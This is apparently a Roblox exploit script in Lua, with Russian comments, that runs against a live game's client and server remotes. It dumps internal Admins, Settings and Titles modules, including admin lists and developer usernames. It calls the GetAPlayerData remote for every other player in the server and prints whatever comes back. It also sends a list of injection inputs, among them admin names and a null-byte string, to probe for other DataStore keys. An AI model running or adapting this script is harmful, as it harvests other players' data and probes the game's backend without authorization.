-- ADMINS DUMP + GETAPLAYERDATA  @Benefit
local RS  = game:GetService("ReplicatedStorage")
local LP  = game:GetService("Players").LocalPlayer
local NET = RS.__Net

local function p(...) print(...) end

-- ══════════════════════════════════════════════════════════════════
-- [1] Полный дамп Admins.List
-- ══════════════════════════════════════════════════════════════════
p("══════ ADMINS MODULE ══════")
local ok, Admins = pcall(require, RS.Shared.Modules.Framework.Admins)
if ok and type(Admins) == "table" then
    p("Keys in Admins: ")
    for k, v in pairs(Admins) do
        p("  [" .. tostring(k) .. "] = " .. type(v))
    end
    p("\nAdmins.List:")
    if type(Admins.List) == "table" then
        for k, v in pairs(Admins.List) do
            p("  [" .. tostring(k) .. "] = " .. tostring(v))
        end
    end
else
    p("Admins require failed: " .. tostring(Admins))
    -- Пробуем через путь напрямую
    pcall(function()
        local fw = RS.Shared.Modules.Framework
        for _, ch in ipairs(fw:GetChildren()) do
            if ch.Name == "Admins" then
                p("Found Admins script, source snippet:")
                local src = ch.Source
                p(src:sub(1, 500))
            end
        end
    end)
end

-- ══════════════════════════════════════════════════════════════════
-- [2] Settings.List — что там внутри
-- ══════════════════════════════════════════════════════════════════
p("\n══════ SETTINGS MODULE ══════")
local ok2, Settings = pcall(require, RS.Shared.Modules.Framework.Settings)
if ok2 and type(Settings) == "table" then
    local function dumpTable(t, indent)
        indent = indent or ""
        for k, v in pairs(t) do
            if type(v) == "table" then
                p(indent .. tostring(k) .. ":")
                dumpTable(v, indent .. "  ")
            else
                p(indent .. tostring(k) .. " = " .. tostring(v))
            end
        end
    end
    dumpTable(Settings)
end

-- ══════════════════════════════════════════════════════════════════
-- [3] GetAPlayerData — после кулдауна, по имени
-- ══════════════════════════════════════════════════════════════════
p("\n══════ GetAPlayerData BY NAME ══════")
local players = game:GetService("Players"):GetPlayers()
for _, pl in ipairs(players) do
    if pl ~= LP then
        p("Waiting 5s cooldown...")
        task.wait(5)
        local ok3, data = pcall(function()
            return NET.GetAPlayerData:InvokeServer(pl.Name)
        end)
        p("Result for " .. pl.Name .. ":")
        if ok3 and type(data) == "table" then
            local function dumpD(t, indent)
                indent = indent or "  "
                for k, v in pairs(t) do
                    if type(v) == "table" then
                        p(indent .. tostring(k) .. " [table]:")
                        dumpD(v, indent .. "  ")
                    else
                        p(indent .. tostring(k) .. " = " .. tostring(v))
                    end
                end
            end
            dumpD(data)
        else
            p("  " .. tostring(data))
        end
    end
end

-- ══════════════════════════════════════════════════════════════════
-- [4] DataStore key injection в GetAPlayerData
-- ══════════════════════════════════════════════════════════════════
p("\n══════ GetAPlayerData KEY INJECTION ══════")
task.wait(3)
local INJECTIONS = {
    "Admin", "admin", "Developer", "Ghoulaxxx", "GhoulaxDev",
    "", "nil", "0", "-1",
    "PardonRx1\0admin",  -- null byte injection
    "Player_1",          -- generic DataStore key format
}
for _, inj in ipairs(INJECTIONS) do
    task.wait(3)
    local ok4, r4 = pcall(function()
        return NET.GetAPlayerData:InvokeServer(inj)
    end)
    local res = tostring(r4 or ""):sub(1, 80)
    if res ~= "" and res ~= "OnCooldown" and res ~= "nil" then
        p("[★] '" .. inj .. "' → " .. res)
    else
        p("[" .. (ok4 and res or "ERR") .. "] '" .. inj .. "'")
    end
end

-- ══════════════════════════════════════════════════════════════════
-- [5] Проверяем можно ли читать Titles.GroupMapping
--     и найти всех dev-usernames
-- ══════════════════════════════════════════════════════════════════
p("\n══════ TITLES GROUP MAPPING ══════")
local ok5, Titles = pcall(require, RS.Shared.Modules.Framework.Titles)
if ok5 and type(Titles) == "table" and Titles.GroupMapping then
    p("GroupMapping full dump:")
    for k, v in pairs(Titles.GroupMapping) do
        local t = type(k) == "number" and "RANK" or "USERNAME"
        p("  [" .. t .. "] " .. tostring(k) .. " = " .. tostring(v))
    end
end

p("\n=== DONE ===")
